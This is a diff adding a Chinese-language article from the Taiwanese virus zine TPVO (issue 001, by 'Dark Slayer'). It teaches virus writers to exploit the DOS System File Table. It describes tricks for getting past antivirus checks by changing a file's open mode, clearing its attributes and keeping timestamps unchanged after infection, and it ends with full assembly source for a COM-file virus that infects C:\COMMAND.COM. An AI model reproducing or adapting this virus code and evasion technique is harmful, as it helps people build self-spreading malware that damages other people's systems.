@@ -1,0 +1,330 @@
+
+               ☆ ＴＰＶＯ病毒雜誌  第００１期  TPVO-001.001 ☆
+
+                         ◎系統檔案表格(SFT) ◎
+                         by Dark Slayer of TPVO
+
+==========================================================================
+
+    嗨！我是DS，由於我住在學校宿舍，但是一個禮拜會回來一次，所以我每個禮拜
+都會寫一些技術資料給各位成員，希望大家好好努力，歡迎寫信和我討論，但是我一
+個禮拜只能回來回一次信，抱歉囉...
+這次我要講的是SFT (System File Table，系統檔案表格) 的應用。
+
+    當我們用DOS 的File Handle 來讀寫檔案時，有沒有人想過它的原理，假設一開
+始檔案指標指向檔案開頭，我們讀取或寫入這個檔案後會改變它的指標，是否有人想
+過它將這個指標值記錄在哪裡? 如果我們寫入一個檔案，DOS 如何能得知在關檔時怎
+樣更改此檔的目錄? 關於這一切檔案處理的資料都記錄在SFT 之中，oh... yeah...
+SFT!!!是寫毒者的強力工具，深入瞭解SFT 並且應用在您的病毒之中，將會使您的毒
+變的更強，事實上... 早在DOS 3.3 的時代就已經有人利用SFT 來寫毒了，他就是保
+加利亞的毒王Dark Avenger，國外使用SFT 的技術很久了，但是我們國內的病毒作者
+卻很少有人懂的去利用SFT(我例外啦... 呵呵呵...)OK！廢話不多說... 我們趕快來
+看看這樣一個好東西...
+
+DOS 4.0-6.2 的 SFT 格式 (取自 INTRLIST，由我翻譯)
+        偏移    大小    描述
+         00h    WORD    參考至此檔案的 handle 個數
+         02h    WORD    開檔模式 (參考 AH=3Dh，int 21h)
+                        如果此檔是利用FCB 來開檔則 bit 15=1
+         04h    BYTE    檔案屬性 (參考 AH=43h，int 21h)
+         05h    WORD    裝置資訊 (參考 AX=4400h，int 21h)
+                        bit 15=1 表是此檔為遠方 (在網路上)
+                        bit 14=1 在關檔時不要設定檔案的日期及時間
+                        bit 7  1: 設備 device，0: 檔案
+                        bit 6 =1 檔案尚未被寫入
+                        bits 5~0 當 bit 7=1 時磁碟機編號 (0=A:，1=B: ...)
+                                 bit 7=0 時為裝置資訊
+         07h    DWORD   如果是字元裝置，則此為指向裝置驅動程式表頭之指標
+                        否則，此為指向DOS 磁碟參數區塊 (DPB) 之指標
+                         (參考 AH=32h，int 21h)
+         0Bh    WORD    檔案的啟始叢集 (cluster)
+         0Dh    WORD    檔案時間 (參考 AH=57h，int 21h)
+         0Fh    WORD    檔案日期 (參考 AH=57h，int 21h)
+         11h    DWORD   檔案大小
+         15h    DWORD   檔案讀寫指標 (參考 AH=42h，int 21h)
+         19h    WORD    最後一次存取的 cluster 之相對 cluster 編號
+         1Bh    DWORD   此檔案目錄進入點的磁區編號 (可用直接用 int 25h/26h 讀寫)
+         1Fh    BYTE    一個磁區中，可容納的目錄個數
+         20h 11 BYTEs   FCB 格式的檔名 (無路徑，無句點 '.'，剩下的空間以
+                        空白 space (ASCII code 20h) 補足
+         2Bh    DWORD   (SHARE.EXE) 指向前一個 SFT 共用相同檔案之指標
+         2Fh    WORD    (SHARE.EXE) 開啟檔案的網路機器編號
+         31h    WORD    檔案擁有者的 PSP 區段，AUX/CON/PRN 指向 IO.SYS
+         33h    WORD    (SHARE.EXE) 在 SHARE 程式段中共用錄的偏移值
+                        0000h=沒有 SHARE
+         35h    WORD    最後一次存取的 cluster 之絕對 cluster 編號
+         37h    DWORD   指向 IFS 驅動程式之指標
+
+看完了上面的資料後是否覺得很複雜? 或是感到興奮? 它可是含括許多好用的東西
+ (或者該叫武器?!)
+
+當我們用DOS 的AH=3Dh int 21h來開檔，DOS 便為此檔建立了SFT ，但是你可能會
+感到疑惑! 如何取得此SFT 的位址呢? 看下面吧...
+
+        mov     ax,3d02h
+        mov     dx,offset file_name
+        int     21h             ; 開檔
+
+        xchg    bx,ax
+        push    bx              ; 存 File Handle，因為底下改變了 BX
+
+        mov     ax,1220h
+        int     2fh             ; 取得工作檔案表格 JFT (Job File Table)
+
+        mov     ax,1216h
+        xor     bh,bh           ; bh=0
+        mov     bl,es:[di]      ; bl=es:[di]=JFT 的編號
+        int     2fh             ; 取得 SFT 的位址
+
+        pop     bx              ; 拿回 File Handle
+
+
+--------D-2F1220-----------------------------
+INT 2F U - DOS 3+ 內部使用 - 取得工作檔案表格
+        AX = 1220h
+        BX = file handle
+傳回:   CF =1 錯誤
+            AL = 6 (無效的 file handle)
+        CF =0 成功
+            ES:DI -> 在目前程序中，檔案代碼的 JFT (byte)
+Notes:  the byte pointed at by ES:DI contains the number of the SFT for the
+          file handle，or FFh if the handle is not open
+        supported by DR-DOS 5.0+
+SeeAlso: AX=1216h,AX=1229h
+--------D-2F1216-----------------------------
+INT 2F U - DOS 3+ internal - 取得 SFT 的位址
+        AX = 1216h
+        BX = SFT 編號 (也就是用 AX=1220h int 2Fh 取得的 JFT)
+Return: CF =0 成功
+            ES:DI -> SFT 位址
+        CF =1，BX 大於 FILES=xxxx
+Note:   supported by DR-DOS 5+
+SeeAlso: AX=1220h
+
+
+帥吧？！利用DOS 未公開的功能int 2Fh 來取得SFT ，事實上int 2Fh 有許多好用
+的功能，以後會介紹的。
+
+    取得SFT 之後要幹嘛? 嘿嘿嘿... 取得它之後，許多酷的技巧都可以靠它展現
+囉，接下來完全要看各人的想像力與創意囉... 我指出幾點可以利用到SFT 的地方
+，其它更深入的應用以後再講，或是你自己可以先試試看，發揮您求知的精神吧！
+
+DOS 4.0-6.2 的 SFT 格式 (取自 INTRLIST，由我翻譯)
+        偏移    大小    描述
+         00h    WORD    參考至此檔案的 handle 個數
+         02h    WORD    開檔模式 (參考 AH=3Dh，int 21h)
+                        如果此檔是利用FCB 來開檔則 bit 15=1
+    我用3D00h 開檔，再將此處改為 2，如此可以用讀寫模式來存取此檔，這樣可
+以騙過那些爛AV，因為AV以為用3D00h 開檔就不可能被寫入了，所以可能會不防這
+招...
+
+         04h    BYTE    檔案屬性 (參考 AH=43h，int 21h)
+
+用3D02h 開檔之前要先用4300h 得到檔案屬性，再用4301h 更改檔案屬性為非隱藏
+、可讀寫嗎？不用啦！！呵呵... 我們只要用3D00h 開檔 (如上面所講) 再保存此
+處之值，然後將它設為０，一樣有相同的功能喔！
+
+         05h    WORD    裝置資訊 (參考 AX=4400h，int 21h)
+                        bit 15=1 表是此檔為遠方 (在網路上)
+                        bit 14=1 在關檔時不要設定檔案的日期及時間
+                        bit 7  1: 設備 device，0: 檔案
+                        bit 6 =1 檔案尚未被寫入
+                        bits 5~0 當 bit 7=1 時磁碟機編號 (0=A:，1=B: ...)
+                                 bit 7=0 時為裝置資訊
+
+在寫入一個檔案之前要先保存它的時間和日期嗎？不必囉... 感染完之後，在關檔
+之前將bit 14設為1 ，則關檔後一樣不會改變到時間和日期。
+
+         07h    DWORD   如果是字元裝置，則此為指向裝置驅動程式表頭之指標
+                        否則，此為指向DOS 磁碟參數區塊 (DPB) 之指標
+                         (參考 AH=32h，int 21h)
+
+Assassin病毒怎麼得，要感染的檔案後面剩餘的cluster 有多少呢？當然是先得知
+此磁碟的一個cluster 有幾個磁區(sector)，再拿檔案長度來算即可得知如何取得
+這些資料呢？當然是從DPB 囉...
+
+         0Bh    WORD    檔案的啟始叢集 (cluster)
+         0Dh    WORD    檔案時間 (參考 AH=57h，int 21h)
+         0Fh    WORD    檔案日期 (參考 AH=57h，int 21h)
+
+不須用AH=57h一樣可以得到檔案時間與日期
+
+         11h    DWORD   檔案大小
+
+不須用AX=4202h，CX=DX=0，int 21h 一樣可以得到檔案大小
+
+         15h    DWORD   檔案讀寫指標 (參考 AH=42h，int 21h)
+
+直接更改這邊的值和用AH=42h int 21h效果是一樣的
+
+         19h    WORD    最後一次存取的 cluster 之相對 cluster 編號
+         1Bh    DWORD   此檔案目錄進入點的磁區編號 (可用直接用 int 25h/26h 讀寫)
+         1Fh    BYTE    一個磁區中，可容納的目錄個數
+         20h 11 BYTEs   FCB 格式的檔名 (無路徑，無句點 '.'，剩下的空間以
+                        空白 space (ASCII code 20h) 補足
+         2Bh    DWORD   (SHARE.EXE) 指向前一個 SFT 共用相同檔案之指標
+         2Fh    WORD    (SHARE.EXE) 開啟檔案的網路機器編號
+         31h    WORD    檔案擁有者的 PSP 區段，AUX/CON/PRN 指向 IO.SYS
+         33h    WORD    (SHARE.EXE) 在 SHARE 程式段中共用錄的偏移值
+                        0000h=沒有 SHARE
+         35h    WORD    最後一次存取的 cluster 之絕對 cluster 編號
+         37h    DWORD   指向 IFS 驅動程式之指標
+
+   OK！我就拿以前病毒教學Lesson one 的那隻小毒來改造，示範如何使用SFT改
+造的部份我用小寫的指令。
+
+=================(Lesson one - new)==========================================
+
+LESSON_1        SEGMENT
+                ASSUME  CS:LESSON_1,DS:LESSON_1
+                ORG     100h
+START:
+                NOP     ; ┐
+                NOP     ; ├> 保留 3 BYTES 的空間
+                NOP     ; ┘
+
+VIR_START:      ; 此處才是真正病毒程式的開端
+
+
+                CALL    LOCATE                  ; 可以想成 PUSH IP
+LOCATE:                                         ;
+                POP     SI                      ;
+                SUB     SI,OFFSET LOCATE        ; 減掉多餘的值，此時 SI=偏移值
+
+; 由於此毒是接在檔案後面，而被感染的檔案大小不一，所以病毒接在檔案後的偏移
+; 也會不一定，而會造成變數無法定位，所以我們要得知偏移了多少
+; 下面程式只要牽涉到和記憶體定址有關的部份，都會加上 [SI] 偏移值
+
+
+                MOV     AX,WORD PTR DS:FIRST_3_BYTE[SI] ; ┬> 恢復記憶體中，原
+                MOV     DS:[100h],AX                    ; │  檔案開頭，被病毒
+                MOV     AL,DS:FIRST_3_BYTE[SI+2]        ; │  改過的 3 BYTES
+                MOV     DS:[100h+2],AL                  ; ┘
+
+; 因為此毒第一次執行時，之前並沒有感染過檔案，而要恢復此 3 BYTES 時會蓋到
+; 病毒本身，所以一開始我們加了 3 個 NOP 來空出此空間，VIR_START 才是真正
+; 的病毒碼開始處
+
+
+                mov     ax,3D00h                ; open file for read only
+
+                LEA     DX,FILE_NAME[SI]        ; DS:DX 指向要開的檔名
+                INT     21h                     ; 呼叫中斷
+
+; 開檔成功後，傳回 AX=檔案代碼 (FILE HANDLE)
+
+                MOV     BX,AX   ; BX = AX = FILE HANDLE
+
+
+                push    bx                      ; save BX
+                mov     ax,1220h
+                int     2fh                     ; get JFT
+                mov     ax,1216h
+                xor     bh,bh
+                mov     bl,es:[di]              ; BL=JFT
+                int     2fh                     ; get SFT
+                pop     bx                      ; restore BX
+
+                mov     word ptr es:[di+2],2    ; file mode = 2 (read/write)
+
+                mov     al,es:[di+4]            ; AL=file attribute
+                push    ax                      ; save AX
+                mov     byte ptr es:[di+4],0    ; set file attribute to zero
+
+
+                MOV     AH,3Fh                  ; 讀檔案
+                MOV     CX,3                    ; 讀取 3 BYTES
+                LEA     DX,FIRST_3_BYTE[SI]     ; DS:DX 指向放資料的位址
+                INT     21h                     ; 呼叫中斷
+
+; 這個動作是讀取檔案開頭的 3 BYTES 到 FIRST_3_BYTE，保存起來
+
+
+              ; MOV     AX,4202h        ; 移動檔案指標 (從檔尾算起)
+              ; XOR     CX,CX           ; CX = 0
+              ; XOR     DX,DX           ; DX = 0 ，從檔尾移動 0 BYTES
+              ; INT     21h             ; 呼叫中斷
+
+                mov     ax,es:[di+11h]  ; AX=file length
+                mov     es:[di+15h],ax  ; set access point to file end
+                                        ; 因為是 .com 檔，小於 64K，
+                                        ; 所以只處裡低字組就可以了
+
+
+; 這個動作是把檔案讀寫指標移到檔尾，而由 DX:AX (DX = HIGH，CX = LOW) 傳回
+; 移動後的指標對於檔頭的距離，所以此時 DX = 0 (COM 檔小於 64K)，AX = 檔案
+; 長度
+
+
+                SUB     AX,3                            ; 計算出 JMP 的偏移值
+                MOV     WORD PTR DS:JMP_BYTE[SI+1],AX   ; 保存偏移值
+
+; 這個動作是計算要從檔頭 JMP 至檔尾 (病毒碼開端) 所需的偏移
+
+
+                MOV     AH,40h                  ; 寫檔案
+                MOV     CX,VIR_SIZE             ; CX = 病毒長度
+                LEA     DX,VIR_START[SI]        ; DS:DX 指向病毒程式開端
+                INT     21h                     ; 呼叫中斷
+
+; 這個動作是把病毒本體寫入檔案，由於上個動作已經把檔案指標移到檔尾，所以
+; 這次的寫入是從檔尾開始，也就是說把病毒體串接在檔尾
+
+
+              ; MOV     AX,4200h        ; 移動檔案指標 (從檔頭算起)
+              ; XOR     CX,CX           ; CX = 0
+              ; XOR     DX,DX           ; DX = 0，從檔頭移動 0 BYTES
+              ; INT     21h             ; 呼叫中斷
+
+                mov     word ptr es:[di+15h],0
+
+; 這個動作是把檔案讀寫指標移到檔頭，以便修改檔頭前 3 BYTES
+
+
+                MOV     AH,40h          ; 寫檔案
+                MOV     CX,3            ; 寫入 3 BYTES
+                LEA     DX,JMP_BYTE[SI] ; DS:DX 指向 JMP 的程式碼
+                INT     21h             ; 呼叫中斷
+
+; 這個動作是把我們原先所記算的 JMP 碼寫到檔頭前 3 BYTES，如此一來程式一執
+; 行就會跳至病毒程式開端
+
+
+                pop     ax              ; AX=file attribute
+                mov     es:[di+4],al    ; restore file attribute
+
+                or      word ptr es:[di+5],0100000000000000b
+                                        ; 關檔時不要改變時間和日期
+
+
+                MOV     AH,3Eh  ; 關檔案
+                INT     21h     ; 呼叫中斷
+
+                push    cs
+                pop     es      ; 因為取SFT 而改變了 es
+
+                MOV     AX,100h ; AX = 100h (COM 檔一開始執行的位址)
+                PUSH    AX      ; PUSH 給下個 RET 指令的值
+                RET             ; RET 到 100h
+
+; 因為病毒該做的是都做完了，所以返回 100h 去執行原檔案
+
+
+FILE_NAME       DB      'C:\COMMAND.COM',0
+FIRST_3_BYTE    DB      0CDh,20h,?      ; DB 0CDh,20h = INT 20h (程式結束)
+JMP_BYTE        DB      0E9h,?,?        ; 0E9h,?,? = JMP XXXX
+
+MSG             DB      'This is [LESSON ONE] virus by Dark Slayer'
+                DB      ' in Keelung, Taiwan <R.O.C> of TPVO'
+
+VIR_SIZE        EQU     $-OFFSET VIR_START
+
+LESSON_1        ENDS
+                END     START
+
+==========================================================================
+
+    有任何疑問的，或是建意，或覺得我的文章讓你看不懂，有須要改進的地方，
+歡迎寫信和我討論...
+
+力口 三由 口巴 ！！！
